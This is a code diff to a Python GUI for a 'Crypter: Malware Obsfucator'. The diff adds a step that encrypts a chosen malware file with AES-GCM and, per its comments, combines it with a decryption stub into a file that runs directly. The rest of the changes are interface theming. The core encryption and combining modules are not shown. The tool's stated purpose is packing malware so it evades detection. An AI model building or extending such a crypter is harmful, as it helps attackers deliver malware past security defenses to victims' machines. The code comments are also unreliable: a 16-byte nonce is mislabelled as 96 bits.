@@ -1,6 +1,8 @@
 import tkinter as tk
 from tkinter import ttk, filedialog
+from ttkthemes import ThemedTk
 from src.combiner import combine
+from src.encrypt_file import encrypt_file
 import os
 
 def select_input_file():
@@ -23,37 +25,50 @@ def process_files():
     print(output_path)
     key = os.urandom(32)  # Generate a random key (AES key size is 256 bits)
     nonce = os.urandom(16)  # Generate a random nonce (GCM nonce size is 96 bits)
-    tag=b""
-    payload=b""
-    combine(key, nonce, tag, payload, output_path)
+    payload, tag = encrypt_file(key, nonce, input_file_path) # Encrypt the malware and return the encrypted payload and tag
+    combine(key, nonce, tag, payload, output_path) # Combine the encrypted payload with the decryption function and write to a new file which is executable from the get go
 
-window = tk.Tk()
+window = ThemedTk(theme="plastik")
 window.title("Crypter: Malware Obsfucator")
+
+# Create a style object
+style = ttk.Style()
+
+# Set the style for Entry widgets
+style.map("EntryField.TEntry",
+          fieldbackground=[("active", "#dddddd"), ("!active", "white")],
+          background=[("active", "#dddddd"), ("!active", "white")],
+          foreground=[("active", "black"), ("!active", "black")])
+
+# Set the style for Button widgets
+style.map("Button.TButton",
+          background=[("active", "#4caf50"), ("!active", "SystemButtonFace")],
+          relief=[("active", "raised"), ("!active", "flat")])
 
 # Input file path
 input_file_label = ttk.Label(window, text="Input File Path:")
 input_file_label.grid(row=0, column=0, padx=10, pady=5)
-input_file_entry = ttk.Entry(window, width=40)
+input_file_entry = ttk.Entry(window, width=40, style="EntryField.TEntry")
 input_file_entry.grid(row=0, column=1, padx=10, pady=5)
-input_file_button = ttk.Button(window, text="Browse", command=select_input_file)
+input_file_button = ttk.Button(window, text="Browse", command=select_input_file, style="Button.TButton")
 input_file_button.grid(row=0, column=2, padx=10, pady=5)
 
 # Output path
 output_path_label = ttk.Label(window, text="Output Path:")
 output_path_label.grid(row=1, column=0, padx=10, pady=5)
-output_path_entry = ttk.Entry(window, width=40)
+output_path_entry = ttk.Entry(window, width=40, style="EntryField.TEntry")
 output_path_entry.grid(row=1, column=1, padx=10, pady=5)
-output_path_button = ttk.Button(window, text="Browse", command=select_output_path)
+output_path_button = ttk.Button(window, text="Browse", command=select_output_path, style="Button.TButton")
 output_path_button.grid(row=1, column=2, padx=10, pady=5)
 
 # Output file name
 output_file_name_label = ttk.Label(window, text="Output File Name:")
 output_file_name_label.grid(row=2, column=0, padx=10, pady=5)
-output_file_name_entry = ttk.Entry(window, width=40)
+output_file_name_entry = ttk.Entry(window, width=40, style="EntryField.TEntry")
 output_file_name_entry.grid(row=2, column=1, padx=10, pady=5)
 
-# Process files button
-process_button = ttk.Button(window, text="Obsfucate the Malware!", command=process_files)
+# Start the obsfucation button
+process_button = ttk.Button(window, text="GO!", command=process_files, style="Button.TButton")
 process_button.grid(row=3, column=1, pady=10)
 
 # Start the GUI event loop
